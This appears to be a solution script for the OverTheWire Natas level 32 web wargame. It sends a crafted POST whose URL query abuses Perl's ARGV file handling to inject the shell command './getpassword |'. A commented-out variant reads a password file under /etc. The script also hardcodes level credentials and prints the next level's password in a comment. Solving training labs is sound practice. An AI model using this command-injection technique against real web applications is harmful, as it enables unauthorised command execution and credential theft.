#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
from urllib.parse import quote

username = "natas32"
password = "no1vohsheCaiv3ieH4em1ahchisainge"

url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()

# the source_code of the challenge still the same
# just we need to execute some binary code file

# injection = "cat /etc/natas_webpass/natas33 | xargs echo|"
injection = "./getpassword |"
injection_url_encoded = quote(injection, safe="")
new_url = url + "?" + injection_url_encoded

# note: there should a 'sample.csv' in the same directory as this script
post_date = {"file": "ARGV"}

post_file = {"file": open("sample.csv", "rb")}

req = requests.Request(
    "POST", new_url, auth=(username, password), data=post_date, files=post_file
)
prep = req.prepare()

response = session.send(prep)
content = response.content

soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)

print()  # just for having some space

# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas33
# Password: shoogeiGa2yee3de6Aex8uaXeech5eey
